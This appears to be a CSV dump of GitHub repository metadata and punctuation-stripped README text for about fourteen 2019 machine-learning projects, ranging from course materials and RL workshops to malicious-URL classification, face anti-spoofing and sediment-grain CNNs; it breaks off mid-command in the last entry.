pukkapies,igssm,n/a,International Graduate Summer School in Mathematics 22 July 09 August 2019 Institute of Mathematics VAST Ha Noi Viet Nam Repository for the Introduction to Machine Learning and Deep Learning course as part of the International Graduate Summer School in Mathematics from 5 9 August 2019 Further resources Jupyter notebook https www dataquest io blog jupyter notebook tutorial Numpy http www labri fr perso nrougier from python to numpy https www machinelearningplus com numpy tutorial part1 array python examples http cs231n github io python numpy tutorial Matplotlib https matplotlib org 3 1 1 tutorials introductory pyplot html https towardsdatascience com matplotlib tutorial learn basics of pythons powerful plotting library b5d1b8f67596 https jakevdp github io PythonDataScienceHandbook 04 00 introduction to matplotlib html Pandas https github com pandas dev pandas https github com justmarkham pandas videos https towardsdatascience com exploratory data analysis with pandas and jupyter notebooks 36008090d813 sklearn https scikit learn org stable tutorial basic tutorial html https www dataquest io blog sci kit learn tutorial https www datacamp com community tutorials machine learning python Datacamp cheat sheets https www datacamp com community data science cheatsheets page 3,2019-07-14T20:30:06Z,2019-10-01T03:45:24Z,Jupyter Notebook,pukkapies,User,0,11,6,48,master,pukkapies,1,0,0,0,0,0,0
mbaske,ml-drone-collection,n/a,Drone Collection Video https www youtube com watch v MKDBcKNJVS4 Tricopter Quadcopter Hexacopter Octocopter drones built in Unity Comes with trained reinforcement models for fixed rotor and tilted rotor control made with Unity Machine Learning Agents https github com Unity Technologies ml agents version 0 8 1 https github com Unity Technologies ml agents releases tag 0 8 1,2019-07-10T09:50:27Z,2019-12-09T11:03:45Z,C#,mbaske,User,0,11,3,1,master,mbaske,1,0,0,0,0,0,0
cambridge-mlg,RAT-SPN,n/a,RAT SPN Code for UAI 19 Random Sum Product Networks A Simple and Effective Approach to Probabilistic Deep Learning V0 2 RAT SPN model Experiments for generative learning of RAT SPNs using EM Experiments for discriminative learning of RAT SPNs using Adam Setup git clone https github com cambridge mlg RAT SPN cd RAT SPN installtensorflowvenv sh source ratspnvenv bin activate python downloadpreprocessdata py Quick Run for Generative Experiments This will simply train a single RAT SPN no crossvalidation python quickrunratspngenerative py python quickevalratspngenerative py Quick Run for Discriminative Training on MNIST This will simply train a single RAT SPN for each depth python quickrunratspnmnist py python quickevalratspndiscriminative py Full Training See the run py and eval py files,2019-06-24T16:46:32Z,2019-12-11T09:59:34Z,Python,cambridge-mlg,Organization,1,11,0,5,master,smatmo,1,0,0,0,0,0,0
ppriyank,-Online-Soft-Mining-and-Class-Aware-Attention-Pytorch,deep-metric-learning#loss-functions#online-soft-mining#personreid#pytorch#tensorflow,Online Soft Mining and Class Aware Attention Implementation of Weighted Contrastive Loss from Deep Metric Learning by Online Soft Mining and Class Aware Attention https arxiv org pdf 1811 01459v2 pdf Xinshao Wang Yang Hua1 Elyor Kodirov Guosheng Hu Neil M Robertson Use person re id Pytorch criterionosmcaa OSMCAALoss if usegpu imgs pids imgs cuda pids cuda imgs pids Variable imgs Variable pids outputs features model imgs if usegpu loss criterionosmcaa features pids model module classifier weight t else loss criterionosmcaa features pids model classifier weight t Tensorflow sess tf Session x tf random uniform 32 200 batch size 32 embedding dim 200 embd tf random uniform 200 10 embedding dim 200 num of classes 10 loss OSMCAALoss osmloss loss forward lossval osmloss x labels embd sess run lossval If you find any deviation from the paper please let me know raise issue I will make the necessary changes Comments dist https github com ppriyank Online Soft Mining and Class Aware Attention Pytorch blob master WeightedContrastiveLoss py L23 refers to the pairwise distance between normalized feature vectors of the shape n x n dij dist i j A https github com ppriyank Online Soft Mining and Class Aware Attention Pytorch blob master WeightedContrastiveLoss py L44 refers to the pairwise attention score Aij min ai aj,2019-07-24T22:35:08Z,2019-12-11T14:42:36Z,Python,ppriyank,User,0,11,1,34,master,ppriyank,1,0,0,2,1,0,1
GGGHSL,Deep-Learning-CV-master,n/a,Deep Learning CV Nikki https weibo com u 6775494073 isall 1 Nikki https wx4 sinaimg cn mw690 007oxhwtgy1g1t1yc3q1nj31dq0rse82 jpg code STAR Week 01 CV Fundamental I Image Processing Low Level Data Augmentation Gamma correction Similarity Transformation Scale Rotation Translation Affine Transformation Perspective Transformation Week 02 CV Fundamental II 1 Image Processing Low Level Image Convolution First order Second order Derivative Gaussian Kernel Image Sharpen Laplacian Operator Edge Detection Sober Operator Image Blurring Median Gaussian 2 Feature Point Mid Level 1 What is Feature Point 2 What is a good Feature Point Very informational Harris Corner Detector Rotation Brightness resistance Scale resistance Corner point is not satisfied 3 What is the form of Feature Point Physical in location Abstract in formation Feature Descriptor 4 How to get a Feature Descriptor SIFT Generate scale space DoG Scale space Extrema Detection Accurate key point localization Eliminating edge responses Orientation assignment Key point descriptor 3 Classical CV Procedure High Level Image Stitching Project01 Image Stitching https github com GGGHSL Deep Learning CV master tree master Project01 Image Stitching Updated Image Classification Bow ML Week 03 ML Fundamental I Introduction To Machine Learning Classical Supervised Learning Linear Regression Logistic Regression SGD Zigzag Week 04 ML Fundamental II Classical Supervised Learning Neural Network Back Propagation Regularization Week 05 ML Fundamental III Classical Supervised Learning SVM Linear SVM Kernels Classical Unsupervised Learning K Means K Means Concept Problems Under fitted Over fitted Bias Variance,2019-07-04T18:42:44Z,2019-12-01T09:29:51Z,Jupyter Notebook,GGGHSL,User,1,10,0,1,master,GGGHSL,1,0,0,1,0,0,0
vdyagilev,RedditMBTI,n/a,,2019-07-22T23:31:03Z,2019-10-28T14:47:37Z,Jupyter Notebook,vdyagilev,User,0,10,2,6,master,vdyagilev,1,0,0,0,0,0,0
krishnaik06,Complete-Deep-Learning,n/a,Complete Deep Learning,2019-08-05T13:43:27Z,2019-09-16T05:28:43Z,Python,krishnaik06,User,2,9,13,2,master,krishnaik06,1,0,0,0,0,0,0
rambasnet,DeepLearningMaliciousURLs,classification#deep-learning#intrusion-detection#tensorflow,Machine Learning Models to Detect and Classify Malicious URLs Introduction This research project compares the accuracies of varioius machine algorithms and deep learning frameworks in detecting and classifying malicious URLs using lexcial features Experiments results show that Random Forest an ensemble based classifier not only outperformed 8 other traditional machine learning classifiers but also some deep neural network models generated by cutting edge popular frameworks such as TensorFlow and PyTorch in detecting and classifying malicious URLs using lexical features Dataset downloaded from https www unb ca cic datasets url 2016 html run Baseline Experiments ipynb jupyter notebook to download dataset using provided Bash script Data Cleanup dropped samples and attributes with NaN Infifinity and mising values removed whitespaces from column attribute names Dataset Summary labeled 5 URL types with total 36 707 samples before cleanup consists of 79 lexical features extracted from URLs table below shows original sample counts Total and New Totals after data cleanup Total Dropping NaN Rows remaining total samples after dropping samples with NaN values 17K rows were dropped Total Dropping NaN Cols remaining total samples after dropping columns attributes with NaN values 7 attributes are dropped as a result with total 72 attributes remaining Dataset URL Type Total Dropping NaN Rows Dropping NaN Cols All csv benign 7 781 2 709 7 781 defacement 7 930 2 477 7 930 malware 6 712 4 440 6 711 phishing 7 586 4 014 7 577 spam 6 698 5 342 6 698 malicious 28 926 16 273 28 916 Machine Learning Algorithms perfomance results using various machine learning algorithms and deep learning frameworks are compared authors of the dataset 1 have evaluated 3 classifiers C4 5 Decision Tree KNN K Nearest Neighbors RF Random Forest RF achieved the best overall results 0 97 Precision and 0 97 Recall on Multi class 0 99 Precision and 0 99 Recall on Single class we evaluate 9 ML classifiers provided in sci kit learn framework 1 Logistic Regression LR Linear Discriminant Analysis LDA K Nearest Neighbors KNN Classification and Regression Trees CART Gaussian Naive Bayes NB Support Vector Machines SVM Random Forest RF Decision Tree DT Ada Boost AB 2 linear classifiers LR and LDA 5 nonlinear KNN CART NB SVM and DT 2 Ensemble based RF AB Deep Learning Frameworks fast ai PyTorch fast ai provides high level Python API wrapper over PyTorch with the goal of making deep learning easier to use PyTorch is an open source Python version of Torch machine learning framework developed by Facebook PyTorch uses dynamic computational graphs a k a Define by Run approach which let you process variable length inputs and outputs network is defined dynamically via the actual forward computation Keras TensorFlow Theano Keras is an open source high level neural networks API written in Python and cabable of running on top of TensorFlow CNTK or Theano Keras allows for easy and fast prototyping through user friendliness modularity and extensibility runs seamlessly on CPU and GPU we experimented with TensorFlow and Theano as backend TensorFlow is an open source ML framework developed by Google TensorFlow uses static computational graphs a k a Define and Run approach Theano is no longer maintained Model Evaluations use 10 fold cross validation to estimate accuracy results split dataset into 10 parts train on 9 and test on 1 and repeat for all combination of train test splits calculate the average accuracy Experiments and Results Multi class Classification All csv classification of URL types benign malware spam phishing defacement Machine Learning Algorithm Results Results on Dataset after Dropping NaN Rows Comparision of Algorithms using Box plot images MLComparisonsDroppedRows png Validation Results from Best Classifer Random Forest Confusion Matrix images RFConfusionDroppedRows png Classification Report precision recall f1 score support defacement 0 97 0 95 0 96 526 benign 0 95 0 97 0 96 546 malware 0 98 0 98 0 98 913 phishing 0 91 0 93 0 92 764 spam 0 99 0 98 0 98 1048 accuracy 0 96 3797 macro avg 0 96 0 96 0 96 3797 weighted avg 0 96 0 96 0 96 3797 Results on Dataset after Dropping NaN Columns Comparision of Algorithms using Box plot images MLComparisonsDroppedCols png Validation Results from Best Classifer Random Forest Confusion Matrix images RFConfusionDroppedCols png Classification Report precision recall f1 score support Defacement 0 98 0 98 0 98 1594 benign 0 97 0 98 0 98 1541 malware 0 99 0 98 0 98 1367 phishing 0 95 0 95 0 95 1523 spam 0 99 0 97 0 98 1315 accuracy 0 97 7340 macro avg 0 97 0 97 0 97 7340 weighted avg 0 97 0 97 0 97 7340 Deep Learning Framework Results Framework CPU Accuracy GPU Accuracy TPU Accuracy Fast AI 97 08 97 23 97 26 Keras TensorFlow 96 37 95 79 95 60 Keras Theano Binary class Classification All csv re labeled defacement malware phishing spam defacement as malicious type 1 and benign as 0 detecting malicious URLs malicious Vs benign Machine Learning Algorithm Results Results on Dataset after Dropping NaN Rows Comparision of Algorithms using Box plot images MLComparisonsDroppedRowsBinary png Validation Results from Best Classifer Random Forest Confusion Matrix images RFConfusionDroppedRowsBinary png Classification Report precision recall f1 score support benign 0 95 0 98 0 97 546 malicious 1 00 0 99 0 99 3251 accuracy 0 99 3797 macro avg 0 97 0 99 0 98 3797 weighted avg 0 99 0 99 0 99 3797 Results on Dataset after Dropping NaN Columns Comparision of Algorithms using Box plot images MLComparisonsDroppedColsBinary png Validation Results from Best Classifer Random Forest Confusion Matrix images RFConfusionDroppedColsBinary png Classification Report precision recall f1 score support benign 0 97 0 98 0 98 1541 malicious 0 99 0 99 0 99 5799 accuracy 0 99 7340 macro avg 0 98 0 99 0 98 7340 weighted avg 0 99 0 99 0 99 7340 Deep Learning Framework Results Framework CPU Accuracy GPU Accuracy TPU Accuracy Fast AI 98 83 98 62 98 73 Keras TensorFlow 98 62 98 70 98 79 Keras Theano References 1 Mohammad Saiful Islam Mamun Mohammad Ahmad Rathore Arash Habibi Lashkari Natalia Stakhanova and Ali A Ghorbani Detecting Malicious URLs Using Lexical Analysis Network and System Security Springer International Publishing P467 482 2016 Your First Machine Learning Project in Python Step by Step https machinelearningmastery com machine learning in python step by step Define by Run https docs chainer org en stable guides definebyrun html TensorFlow Static Graphs https pytorch org tutorials beginner pytorchwithexamples html Home Keras Documentation https keras io TensorFlow TensorFlow https www tensorflow org,2019-07-01T19:32:44Z,2019-12-09T08:12:10Z,Jupyter Notebook,rambasnet,User,2,9,2,60,master,rdunski#rambasnet#ndbellew,3,0,0,1,2,0,0
dlime,Faster_OpenCV_4_Raspberry_Pi,arm7l#armhf#computer-vision#debian-packages#deep-learning#neon#opencv-python#opencv3-python#opencv4#python2-python3#raspberry-pi#raspbian#tbb#vfpv3,Faster OpenCV for Raspberry Pi Leverage all your CPUs power in OpenCV by using TBB Neon and VFPV3 libraries Since I ve already compiled this on my own Raspberry Pi I made it available on GitHub Save countless of compile time by just installing these debs Enjoy What is this A pre compiled OpenCV 4 1 1 for Raspberry Pi optimized for deep learning computer vision applications NEON VFPV3 TBB turned on Bindings for Python 2 and Python 3 are also included For detailed build informations click here buildinformation txt Created with OpenCV cpack targets Tested on Raspberry Pi 3 using Raspbian Buster Debian 10 for Raspbian Stretch click here https github com dlime FasterOpenCV4RaspberryPi releases tag stretch410 How much faster Performance tests have been made in this great blog article https www pyimagesearch com 2017 10 09 optimizing opencv on the raspberry pi which led to an approximate 30 increase in speed and of over 48 when applied strictly to DNN module Another performance test is available here https www theimpossiblecode com blog faster opencv smiles tbb which also led to about 30 increase in speed How to use it Install OpenCV library prerequisites on your Raspberry Pi sudo apt get update sudo apt get upgrade y sudo apt get install y libjpeg dev libpng dev libtiff dev libgtk 3 dev libavcodec extra libavformat dev libswscale dev libv4l dev libxvidcore dev libx264 dev libjasper1 libjasper dev libatlas base dev gfortran libeigen3 dev libtbb dev Install numpy based on your target Python version sudo apt get install y python3 dev python3 numpy or sudo apt get install y python dev python numpy How to install Clone the repo into your Raspberry Pi and install all debs git clone https github com dlime FasterOpenCV4RaspberryPi git cd FasterOpenCV4RaspberryPi debs sudo dpkg i OpenCV deb sudo ldconfig How to test C Test the installation by going to tests cpp test folder build it and launch the executable cd FasterOpenCV4RaspberryPi tests cppopencvtest mkdir build cd build cmake make j cat proc cpuinfo grep c processor cppopencvtest Python Test the installation by going to tests folder and launch the test py file cd FasterOpenCV4RaspberryPi tests pythonopencvtest python test py You shouldn t see any error messages in console and an image with tetris blocks with contours drawed should appear How to uninstall Run the following command in your Raspberry Pi terminal sudo apt purge opencv,2019-06-30T07:47:54Z,2019-10-30T00:50:24Z,C++,dlime,User,0,9,6,10,master,dlime,1,3,3,0,0,0,0
eric-haibin-lin,AMLC19-GluonNLP,n/a,AMLC 2019 Dive into Deep Learning for Natural Language Processing Time Friday July 12 2019Location Meeting Center 02 100 2031 7th Ave Seattle WA 98121 https goo gl maps LHWeYRDMYPvNKw3n6 Presenter Haibin Lin Leonard Lausen Xingjian Shi Haichen Shen He He Sheng Zha nbsp nbsp nbsp nbsp nbsp nbsp Abstract Deep learning has rapidly emerged as the most prevalent approach for training predictive models for large scale machine learning problems Advances in the neural networks also push the limits of available hardware requiring specialized frameworks optimized for GPUs and distributed cloud based training Moreover especially in natural language processing NLP models contain a variety of moving parts character based encoders pre trained word embeddings long short term memory LSTM cells transformer layers and beam search for decoding sequential outputs among others This introductory and hands on tutorial walks you through the fundamentals of machine learning and deep learning with a focus on NLP We start off with a crash course on deep learning for NLP with GluonNLP https gluon nlp mxnet io covering data automatic differentiation and various model architectures such as convolutional recurrent and attentional neural networks Then we dive into how context free and contextual representations help various NLP domains Throughout the tutorial we start off from the basic classification problem and progress into how it can be structured to solve various NLP problems such as sentiment analysis question answering machine translation and natural language generation Finally we demonstrate how we can deploy a state of the art NLP model such as BERT on custom hardware such as EC2 A1 instances https aws amazon com ec2 instance types a1 with the help of TVM https tvm ai Agenda Time Title 13 15 14 15 Natural Language Processing and Deep Learning Basics 14 15 14 25 Break 14 25 15 15 Word Embeddings and Applications of Basic Models 15 15 15 55 Machine Translation and Sequence Generation 15 55 16 35 Contextual Representations with BERT 16 35 16 45 Break 16 45 17 15 Model Deployment with TVM FAQ Q How do I get access to the notebooks from the tutorial There are two notebook instances used in this tutorial All sessions except model deployment session use the following setup For setting it up on SageMaker notebook instances you can find the instructions here sagemakersetup md For setting up with Conda you can use the following Conda environment files CPU env amlc19 cpu yml and GPU env amlc19 gpu yml See this guide https docs conda io projects conda en latest user guide tasks manage environments html creating an environment from an environment yml file on creating Conda environment from environment file The notebook instances for model deployment can be set up from the following setting For setting it up on SageMaker notebook instances you can find the instructions here sagemakersetuptvm md,2019-06-28T17:29:16Z,2019-07-21T23:30:35Z,Python,eric-haibin-lin,User,5,9,0,2,master,eric-haibin-lin,1,0,0,0,0,0,2
aramis-lab,AD-DL,n/a,Clinica Deep Learning AD This repository contains a software framework for reproducible experiments with convolutional neural networks CNN on automatic classification of Alzheimer s disease AD using anatomical MRI data from the publicly available dataset ADNI It is developed by Junhao Wen Elina Thibeau Sutre and Mauricio Diaz The preprint version of the corresponding paper may be found here https arxiv org abs 1904 07773 Automatic Classification of AD using a classical machine learning approach can be performed using the software available here This software is currently in active developmet Pretrained models for the CNN networks can be obtained here Bibliography All the papers described in the State of the art section of the manuscript may be found at this URL address Dependencies Python 3 6 Clinica needs only to perform preprocessing Numpy Pandas Scikit learn Pandas Pytorch Nilearn Nipy TensorBoardX How to use Create a conda environment with the corresponding dependencies conda create name clincadlenvpy36 python 3 6 jupyter conda activate clinicadlenvpy36 conda install c aramislab c conda forge clinica git clone git github com aramis lab AD DL git cd AD DL pip install r requirements txt conda install c pytorch pytorch torchvision Install the package clinicadl as developer cd clinicadl pip install e Use in command line mode bash clinicadl h usage clinicadl h preprocessing extract train classify Clinica Deep Learning optional arguments h help show this help message and exit Task to execute with clinicadl What kind of task do you want to use with clinicadl preprocessing extract train validate classify preprocessing extract train classify Stages task to execute with clinicadl preprocessing Prepare data for training needs clinica installed extract Create data slices or patches for training train Train with your data and create a model classify Classify one image or a list of images with your previouly trained model Typical use for preprocessing bash clinicadl preprocessing np 32 BIDSDIR CAPSDIR TSVFILE REFTEMPLATE WORKINGDIR For detailed instructions type clinica action h For example bash clinicadl train h usage clinicadl train h gpu np NPROC batchsize BATCHSIZE evaluationsteps EVALUATIONSTEPS preprocessing linear mni diagnoses DIAGNOSES DIAGNOSES baseline minmaxnormalization nsplits NSPLITS split SPLIT tAE accumulationsteps ACCUMULATIONSTEPS epochs EPOCHS learningrate LEARNINGRATE patience PATIENCE tolerance TOLERANCE addsigmoid pretrainedpath PRETRAINEDPATH pretraineddifference PRETRAINEDDIFFERENCE subject slice patch svm capsdirectory tsvpath outputdir network positional arguments subject slice patch svm Choose your mode subject level slice level patch level svm capsdirectory Data using CAPS structure tsvpath tsv path with sujets sessions to process outputdir Folder containing results of the training network CNN Model to be used during the training optional arguments h help show this help message and exit gpu usegpu Uses gpu instead of cpu if cuda is available np NPROC nproc NPROC Number of cores used during the training batchsize BATCHSIZE Batch size for training default 2 evaluationsteps EVALUATIONSTEPS esteps EVALUATIONSTEPS Fix the number of batches to use before validation preprocessing linear mni Defines the type of preprocessing of CAPS data diagnoses DIAGNOSES DIAGNOSES d DIAGNOSES DIAGNOSES Take all the subjects possible for autoencoder training baseline if True only the baseline is used minmaxnormalization n Performs MinMaxNormalization nsplits NSPLITS If a value is given will load data of a k fold CV split SPLIT Will load the specific split wanted tAE trainautoencoder Add this option if you want to train an autoencoder accumulationsteps ACCUMULATIONSTEPS asteps ACCUMULATIONSTEPS Accumulates gradients in order to increase the size of the batch epochs EPOCHS Epochs through the data default 20 learningrate LEARNINGRATE lr LEARNINGRATE Learning rate of the optimization default 0 01 patience PATIENCE Waiting time for early stopping tolerance TOLERANCE Tolerance value for the early stopping addsigmoid Ad sigmoid function at the end of the decoder Or use the scripts Look at the clinicadl scripts folder Run testing pytest clinicadl tests,2019-07-15T15:02:36Z,2019-12-15T03:09:33Z,Python,aramis-lab,Organization,5,9,3,662,master,14thibea#anbai106#mdiazmel#alexandreroutier,4,0,1,0,0,0,1
xxxnell,semantic-segmentation-zoo,n/a,Semantic Segmentation Zoo This repository provides various models docs models md for semantic segmentation The goal is to compare the various semantic segmentation models and make it easier to implement new model Complete with the following Training and testing modes Data augmentation Several state of the art models Easily plug and play with different models Able to use any dataset Evaluation including precision recall f1 score average accuracy per class accuracy and mean IoU Plotting of loss function and accuracy over epochs Getting Started This project has the following dependencies Numpy sudo pip install numpy OpenCV Python sudo apt get install python opencv TensorFlow sudo pip install upgrade tensorflow gpu Then you can simply run train py Default dataset is CamVid http mi eng cam ac uk research projects VideoRec CamVid See usage docs usage md documentation for more details Contributing Contributions are always welcome Any kind of contribution such as writing a unit test documentation bug fix is helpful Fo more detail see the contributing CONTRIBUTING md documentation License All code is available to you under the Apache License 2 0 LICENSE Copyright the maintainers,2019-07-11T05:57:45Z,2019-12-08T07:57:51Z,Python,xxxnell,User,1,8,7,190,master,GeorgeSeif#Spritea#willook#xxxnell#aweek43#mrshu#smajida#1453042287#SimonDeussen,9,0,0,17,1,2,6
huguesva,Face-Anti-Spoofing-Neural-Network,n/a,Face Anti Spoofing Neural Network This repository contains a PyTorch implementation of the Paper Learning Deep Models for Face Anti Spoofing Binary or Auxiliary Supervision Yaojie Liu Amin Jourabloo Xiaoming Liu from Michigan State University http cvlab cse msu edu pdfs LiuJourablooLiuCVPR2018 pdf Goal of the system This model is able to discriminate between sequences showing live and spoof faces and can therefore be applied to biometric security systems The innovative aspect of this approach is that the decision is made based on two explicit criteria the depth map and the estimated rPPG signal Images modeloutputs png Data cleaning process Using the OULU http www ee oulu fi jukmaatt papers FG2017OULU NPU pdf dataset as training examples the labels have been generated using Face Alignment in Full Pose Range A 3D Total Solution https github com cleardusk 3DDFA for the depth map and Heartbeat Measuring heart rate using remote photoplethysmography rPPG https github com prouast heartbeat for the heartbeat signal Images datacleaning png System architecture Images systemarchitecture png Ameliorations suggested in this project Instead of using the depth map labels as coordinates for the rotation of the face in the non rigid registration layer we train a multi layer perceptron called Antispoofnetrotateur to perform it With this amelioration the system if fully autonomous,2019-07-06T08:53:57Z,2019-12-11T08:57:21Z,Python,huguesva,User,2,8,4,10,master,huguesva,1,0,0,1,0,0,0
Cheukting,rl_workshop,n/a,Step into the AI Era Deep Reinforcement Learning Workshop In this workshop through exercises we will learn about Deep Reinforcement Learning and how to implement different strategies and train an agent to solve different tasks or play games in OpenAI Gym https gym openai com For the consistency of the environment and make use of a free GPU we will use Google Colaboratory http colab research google com Google Account needed Table of Contents Part 1 What is Reinforcement Learning what is reinforcement learning 101 of Reinforcement Learning 101 of reinforcement learning Crossentropy Method crossentropy method Exercise Crossentropy Method https colab research google com github Cheukting rlworkshop blob master exercises rlworkshopcrossentropymethod ipynb Exercise Deep Crossentropy Method https colab research google com github Cheukting rlworkshop blob master exercises rlworkshopdeepcrossentropymethod ipynb Part 2 Model free Model model free model Cliff World Q learning vs SARSA cliff world q learning vs sarsa Exercise Cliff World https colab research google com github Cheukting rlworkshop blob master exercises rlworkshopcliffworld ipynb Part 3 Experience Replay experience replay Approximate Q learning and Deep Q Network approximate q learning and deep q network Exercise DQN https colab research google com github Cheukting rlworkshop blob master exercises rlworkshopdqn ipynb What is Reinforcement Learning Also classified as machine learning what makes reinforcement learning stands out is that an example is not necessary for training so it is not supervised learning However different from unsupervised learning like k mean clustering or anomaly detection reinforcement learning takes a bottom up approach rather than a top down approach By trying out different actions with different policy and record different outcomes rewards we train an agent that creates it s own training data from trials and learn from it Sometimes reinforcement learning is listing alongside supervised learning and unsupervised learning as one of three basic machine learning paradigms 1 101 of Reinforcement Learning First we will go through the basics of reinforcement learning Almost all problems we solved using reinforcement learning will involve defining a set of agent states in the environment and a set of actions that can be taken by the agent with what rewards those can lead to The very basic of how this works is to make use of Markov decision process MDP Markov decision process Markov decision process https upload wikimedia org wikipedia commons thumb a ad MarkovDecisionProcess svg 800px MarkovDecisionProcess svg png To explain for the agent at each state it can take an action which will have a different probability to move to a different state which will lead to different rewards 2 Finding the winning policy The goal of reinforcement learning is to find the policy strategies of what series of actions to take that gain the maximum rewards possible You may want to try brute force which is to try all combination of actions to take and pick the best policy But most of the time it will not work as the number of policies can be large or even infinite Practically speaking we will need other algorithms to pick the best policy or the best one we came across so far We will introduce some of the popular ones in this workshop We will also try to implement them in Python with Keras and Tensorflow to solve problems or play games in OpenAI Gym Crossentropy Method Crossentropy method is considered as Monte Carlo methods as it s mechanism involve trying different actions many times provided that 1 the MDP is finite 2 sufficient memory is available 3 problem is episodic 4 after each episode a new one starts fresh For details and mathematic explanation of crossentropy method can be found on Wikipedia https en wikipedia org wiki Cross entropymethod To summarize an overview of what we gonna do with crossentropy method While it has not converge 1 Sample N policies with the current distribution 2 Evaluate the N policies 3 Choosing the best m of the policies 4 Update the distribution according to the policies we have chosen Exercises Crossentropy Method Open In Colab https colab research google com assets colab badge svg https colab research google com github Cheukting rlworkshop blob master exercises rlworkshopcrossentropymethod ipynb Deep Crossentropy Method Open In Colab https colab research google com assets colab badge svg https colab research google com github Cheukting rlworkshop blob master exercises rlworkshopdeepcrossentropymethod ipynb Model free Model So far we have to know exactly what will happen when we take a certain action at a current state That is the rewards and the next state for each state action pair What if we are not sure which is most of what happened in real life and can only have expectation values for the rewards Q s a at a certain state action from a statistic point of view Here comes the Model free Model the differences are Model based you know P s s a can apply dynamic programming can plan ahead Model free you can sample trajectories can try stuff out insurance not included To find the expectation there are 2 strategies 1 Monte Carlo In this method the whole sampled path of playing the game form the start to finish will be completed and the average Q will be considered This method is less reliant on the Markov property 2 Temporal Difference In this method the recurrent formula for Q will be involved and the agent will learn from the partial trajectory Learning on the go It is great for infinite MDP and needs less experience to learn Cliff World Q learning vs SARSA Sometimes it can also be referred to as off policy vs on policy the different between Q learning and SARSA is on policy e g SARSA Agent can pick actions Agent always follows his own policy off policy e g Q learning Agent can t pick actions Learning with exploration playing without exploration Learning from expert expert is imperfect Learning from sessions recorded data One famous example is the Cliff World Cliff World http ai berkeley edu projects release reinforcement v1 001 discountgrid png As you can see in theory if the agent always picks the most optimal path off policy Q learning it will always pick the lower path However during training the epsilon greedy exploration With probability take random action otherwise take optimal action can make the robot easily fail as one step downwards will push the robot in the gutter 10 rewards so the agent will actually never learn the optimal path In this case SARSA on policy is more desirable as it gets optimal rewards under current policy so for the path at the bottom the exception rewards for each tile is low as it also count the risk of stepping into the gutter by mistake or exploration Exercise Cliff World Open In Colab https colab research google com assets colab badge svg https colab research google com github Cheukting rlworkshop blob master exercises rlworkshopcliffworld ipynb Experience Replay In deep learning the same set of data will be used to train the model in many epoch However the training data we have so far are only used one off Sometime the game takes a long time to play it once and thus training will be computationally expensive To slightly improve this situation we can store the gaming experience with a buffer Then we can train on random subsamples of it so we don t need to re visit same s a many times in playing the game to learn it Also note that it only works with off policy algorithms Approximate Q learning and Deep Q Network State space can be large and sometimes continuous so kind of like what we did to make Crossentropy Method into Deep Crossentropy Method we can approximate agent with a function and learn Q value using a neural network This is what we will do in the following exercise The famous DQN Paper was published by Google Deep Mind to play Atari Breakout in 2015 the design involve stacking 4 flames together so you can see the action of the ball movement and use a CNN as an agent We will try implementing it in the last exercise before that feel free to check out the video https www youtube com embed V1eYniJ0Rnk enablejsapi 1 of how a fully trained agent play the game Exercise DQN Open In Colab https colab research google com assets colab badge svg https colab research google com github Cheukting rlworkshop blob master exercises rlworkshopdqn ipynb Credit Big thanks to Yandex School of Data Analysis https github com yandexdataschool PracticalRL which most of the content of this workshop are based on 1 https en wikipedia org wiki Reinforcementlearning 2 https commons wikimedia org wiki File MarkovDecisionProcess svg,2019-07-29T17:55:27Z,2019-10-08T23:11:19Z,Jupyter Notebook,Cheukting,User,1,8,2,13,master,Cheukting#agarwal-akash,2,0,0,1,1,0,1
MARDAScience,SediNet,n/a,SediNet Build your own sediment descriptor By Dr Daniel Buscombe daniel mardascience com DOI https zenodo org badge 199072106 svg https zenodo org badge latestdoi 199072106 Deep learning framework for optical granulometry https en wikipedia org wiki Opticalgranulometry estimation of sedimentological variables from sediment imagery About SediNet A configurable machine learning framework for estimating either or both continuous and categorical variables from a photographic image of clastic sediment For more details please see the paper Buscombe D 2019 SediNet a configurable deep learning model for mixed qualitative and quantitative optical granulometry Earth Surface Processes and Landforms https onlinelibrary wiley com doi abs 10 1002 esp 4760 Free Earth ArXiv preprint here https eartharxiv org fwsnp This repository contaisn code and data to reproduce the above paper as well as additional examples and jupyter notebooks that you can run on the cloud and use as examples to build your own Sedinet sediment descriptor SediNet can be configured and trained to estimate up to nine numeric grain size metrics in pixels from a single input image Grain size is then recovered using the physical size of a pixel note that sedinet doesn t help you estimate that Appropriate metrics include mean median or any other percentile equivalent sieve diameters directly from image features without the need for area to mass conversion formulas and without even knowing the scale of one pixel SediNet might be useful for other metrics such as sorting standard deviation skewness etc categorical variables such as grain shape population colour etc The motivating idea behind SediNet is community development of tools for information extraction from images of sediment You can use SediNet off the shelf or other people s models or configure it for your own purposes You can even choose to contribute imagery back to the project so we can build bigger and better models collaboratively If that sounds like something you would like to do there is a special repo https github com MARDAScience SediNet Contrib for you wonderful people Within this package there are several examples of different ways it can be configured for estimating categorical variables and various numbers of continuous variables You can use the models in this repository for your purposes and you might find them useful because they have been trained on large numbers of images If that doesn t work for you you can train SediNet for your own purposes even on small datasets How SediNet works Sedinet is a deep learning https en wikipedia org wiki Deeplearning model which is a type of machine learning model that uses very large neural networks to automatically extract features from data to make predictions For imagery network layers typically use convolutions therefore the models are called Convolutional Neural Networks https en wikipedia org wiki Convolutionalneuralnetwork or CNNs for short CNNs have multiple processing layers called convolutional layers https machinelearningmastery com convolutional layers for deep learning neural networks or blocks and nonlinear transformations that include batch normalization https en wikipedia org wiki Batchnormalization activation https en wikipedia org wiki Activationfunction and dropout https en wikipedia org wiki Dropout neuralnetworks with the outputs from each layer passed as inputs to the next The model architecture is summarised below Fig3 sedinetfigann2v3 https user images githubusercontent com 3596509 61979684 59a79700 afa9 11e9 9605 4f893784f65b png Run in your browser The following links will open jupyter notebooks in Google Colab which is a free cloud computing service Categorical Use SediNet to estimate sediment population Open this link https colab research google com drive 1M hX5oBS2K0hof4oVG15oNvNSi9AD2E Use SediNet to estimate sediment shape Open this link https colab research google com drive 1mSxuJzto6QReAddGZ6A0fZg1o9qLljN which is equivalent to the following respective commands from the command line using an installed SediNet see below python sedinetpredictcategorical py c configpop json and python sedinetpredictcategorical py c configshape json Continuous Sediment grain size prediction sieve size on a small population of beach sands Open this link https colab research google com drive 1CFkE4meWHQ7ylmWSN01BO8qJu2fcpvcS Sediment grain size prediction 9 percentiles of the cumulative distribution on a small population of beach sands Open this link https colab research google com drive 1GYZUVkLLQQhJygwsrkR11dDWAlLCy5aJ Sediment grain size prediction 9 percentiles of the cumulative distribution on a large 400 image dataset Open this link https colab research google com drive 11sm53rkS dYjanBPVAAUM7VnjEBWH59v which is equivalent to the following respective commands from the command line using an installed SediNet see below python sedinetpredictcontinuous py c 